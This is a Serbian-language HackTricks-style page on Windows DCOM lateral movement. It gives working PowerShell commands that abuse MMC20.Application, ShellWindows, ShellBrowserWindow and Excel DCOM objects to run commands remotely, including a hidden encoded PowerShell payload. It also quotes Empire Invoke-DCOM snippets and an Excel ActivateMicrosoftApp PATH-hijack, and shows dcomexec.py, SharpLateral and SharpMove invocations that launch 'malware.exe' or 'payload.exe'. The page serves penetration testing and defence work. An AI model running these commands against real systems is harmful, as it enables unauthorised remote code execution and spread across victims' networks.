# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement je privlačan zato što ponovo koristi postojeće COM servere izložene preko RPC/DCOM-a, umesto kreiranja servisa ili scheduled task-a. U praksi to znači da početna konekcija obično počinje na TCP/135, a zatim prelazi na dinamički dodeljene visoke RPC portove.

## Preduslovi i važne napomene

- Obično vam je potreban kontekst lokalnog administratora na targetu, a udaljeni COM server mora dozvoljavati remote launch/activation.
- Od **14. marta 2023.** Microsoft primenjuje DCOM hardening na podržanim sistemima. Stari klijenti koji zahtevaju nizak nivo authentication-a za activation mogu da zakažu, osim ako ne dogovore najmanje `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Moderni Windows klijenti se obično automatski podižu na odgovarajući nivo, tako da aktuelni alati najčešće i dalje rade.<sup>[[3]](#references)</sup>
- Ručno ili skriptovano DCOM izvršavanje uglavnom zahteva TCP/135, kao i opseg dinamičkih RPC portova targeta. Ako koristite Impacket-ov `dcomexec.py` i želite da dobijete izlaz komande, obično vam je potreban i SMB pristup share-u `ADMIN$` (ili drugom share-u sa mogućnošću čitanja/pisanja).
- Ako RPC/DCOM radi, ali je SMB blokiran, `dcomexec.py -nooutput` i dalje može biti koristan za blind execution.

Brze provere:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Za više informacija o ovoj tehnici pogledajte originalnu objavu na [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objekti pružaju zanimljivu mogućnost za mrežne interakcije zasnovane na objektima. Microsoft pruža sveobuhvatnu dokumentaciju za DCOM i Component Object Model (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Spisak DCOM aplikacija može se dobiti pomoću PowerShell komande:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM objekat, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava skriptovanje operacija MMC snap-in-a. Posebno je značajno što ovaj objekat sadrži metodu `ExecuteShellCommand` u okviru `Document.ActiveView`. Više informacija o ovoj metodi možete pronaći [here](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Proverite njeno pokretanje:

Ova funkcija omogućava izvršavanje komandi preko mreže korišćenjem DCOM aplikacije. Za daljinsku interakciju sa DCOM-om kao admin, PowerShell se može koristiti na sledeći način:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ova komanda se povezuje sa DCOM aplikacijom i vraća instancu COM objekta. Zatim se može pozvati metoda ExecuteShellCommand za izvršavanje procesa na udaljenom hostu. Proces obuhvata sledeće korake:

Provera metoda:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Dobijanje RCE-a:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Poslednji argument predstavlja stil prozora. `7` održava prozor minimizovanim. Operativno, izvršavanje zasnovano na MMC-u obično dovodi do toga da udaljeni proces `mmc.exe` pokrene vaš payload, što se razlikuje od objekata zasnovanih na Explorer-u navedenih u nastavku.

## ShellWindows & ShellBrowserWindow

**Za više informacija o ovoj tehnici pogledajte originalnu objavu [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Utvrđeno je da objektu **MMC20.Application** nedostaje eksplicitni "LaunchPermissions", pa se podrazumevano koriste dozvole koje Administratorima omogućavaju pristup. Za više detalja možete pogledati [ovu temu](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje alata OleView .NET autora [@tiraniddo](https://twitter.com/tiraniddo) za filtriranje objekata bez eksplicitne Launch Permission dozvole.

Dva konkretna objekta, `ShellBrowserWindow` i `ShellWindows`, izdvojena su zbog nedostatka eksplicitnih Launch Permissions dozvola. Odsustvo `LaunchPermission` registry unosa u okviru `HKCR:\AppID\{guid}` označava da ne postoje eksplicitne dozvole.

U poređenju sa objektom `MMC20.Application`, ovi objekti su često manje upadljivi iz OPSEC perspektive, jer se komanda na udaljenom hostu obično izvršava kao child proces od `explorer.exe`, a ne od `mmc.exe`.

### ShellWindows

Za `ShellWindows`, koji nema ProgID, .NET metode `Type.GetTypeFromCLSID` i `Activator.CreateInstance` omogućavaju instanciranje objekta pomoću njegovog AppID-a. Ovaj proces koristi OleView .NET za preuzimanje CLSID-a objekta `ShellWindows`. Nakon instanciranja, interakcija je moguća preko metode `WindowsShell.Item`, što dovodi do pozivanja metode poput `Document.Application.ShellExecute`.

Obezbeđene su sledeće PowerShell komande za instanciranje objekta i udaljeno izvršavanje komandi:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` je sličan, ali ga možete direktno instancirati putem njegovog CLSID-a i preći na `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement pomoću Excel DCOM Objects

Lateral movement se može postići iskorišćavanjem DCOM Excel objects. Za detaljne informacije preporučuje se čitanje diskusije o korišćenju Excel DDE za lateral movement putem DCOM-a na [blogu kompanije Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Projekat Empire pruža PowerShell script koji demonstrira korišćenje Excela za remote code execution (RCE) manipulisanjem DCOM objects. U nastavku se nalaze isečci iz script-a dostupnog u [Empire-ovom GitHub repository-ju](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), koji prikazuju različite metode za abuse Excela radi RCE-a:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Nedavna istraživanja proširila su ovu oblast pomoću metode `Excel.Application`-a `ActivateMicrosoftApp()`. Ključna ideja je da Excel može pokušati da pokrene zastarele Microsoft aplikacije kao što su FoxPro, Schedule Plus ili Project tako što ih pretražuje u sistemskom `PATH`-u. Ako operator može da postavi payload sa jednim od očekivanih naziva na lokaciju sa dozvolom za upis koja je deo ciljnog `PATH`-a, Excel će ga izvršiti.<sup>[[4]](#references)</sup>

Zahtevi za ovu varijaciju:

- Local admin na targetu
- Excel instaliran na targetu
- Mogućnost upisivanja payload-a u direktorijum sa dozvolom za upis koji se nalazi u ciljnom `PATH`-u

Praktičan primer zloupotrebe FoxPro pretrage (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Ako napadački host nema lokalno registrovan `Excel.Application` ProgID, instancirajte udaljeni objekat pomoću CLSID-a:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Vrednosti za koje je u praksi uočena zloupotreba:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Alati za automatizaciju za Lateral Movement

Istaknuta su dva alata za automatizaciju ovih tehnika:

- **Invoke-DCOM.ps1**: PowerShell skripta koju obezbeđuje projekat Empire i koja pojednostavljuje pozivanje različitih metoda za izvršavanje koda na udaljenim mašinama. Ova skripta je dostupna u Empire GitHub repozitorijumu.

- **SharpLateral**: Alat namenjen udaljenom izvršavanju koda, koji se može koristiti sledećom komandom:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatski alati

- Powershell skripta [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) omogućava jednostavno pozivanje svih komentarisanim načina za izvršavanje koda na drugim mašinama.
- Možete koristiti Impacket-ov `dcomexec.py` za izvršavanje komandi na udaljenim sistemima pomoću DCOM-a. Trenutne verzije podržavaju `ShellWindows`, `ShellBrowserWindow` i `MMC20`, a podrazumevano koriste `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Takođe možete koristiti [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Takođe možete koristiti [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Reference

- [1] [Lateral Movement korišćenjem MMC20.Application COM Object-a](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement preko DCOM-a: Drugi krug](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Upravljanje izmenama za Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Abuse Power of DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Korišćenje Excel DDE-a za Lateral Movement preko DCOM-a](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)

{{#include ../../banners/hacktricks-training.md}}
